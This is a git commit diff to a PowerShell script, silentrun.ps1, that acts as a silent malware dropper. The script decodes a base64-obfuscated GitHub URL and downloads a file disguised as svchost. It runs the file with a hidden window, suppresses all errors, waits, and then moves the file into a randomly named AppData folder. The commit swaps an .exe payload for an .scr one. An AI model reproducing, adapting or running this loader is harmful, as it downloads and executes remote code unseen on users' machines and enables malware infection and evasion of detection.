b419c4eebbbff3b400f2a05ad728228086d2b8a1
Unhiin <133892941+hypnotixx0@users.noreply.github.com>
2026-05-10 21:29:28 -0700

    Change EXE runner to SCR runner in script

--- silentrun.ps1
+++ silentrun.ps1
@@ -1,11 +1,13 @@
-# Silent EXE Runner
-$exeUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LmV4ZQ=="))
+# Silent SCR Runner
+$scrUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LnNjcg=="))
+$downloadPath = "$env:USERPROFILE\Downloads\svchost.scr"
 $randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 $finalPath = "$env:APPDATA\$randomFolder"
-$randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_}) + ".exe"
 
 try {
+    Invoke-WebRequest -Uri $scrUrl -OutFile $downloadPath -UseBasicParsing
+    Start-Process -FilePath $downloadPath -WindowStyle Hidden
+    Start-Sleep -Seconds 900
     New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
-    Invoke-WebRequest -Uri $exeUrl -OutFile "$finalPath\$randomName" -UseBasicParsing
-    Start-Process -FilePath "$finalPath\$randomName" -WindowStyle Hidden
+    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.scr" -Force
 } catch {}
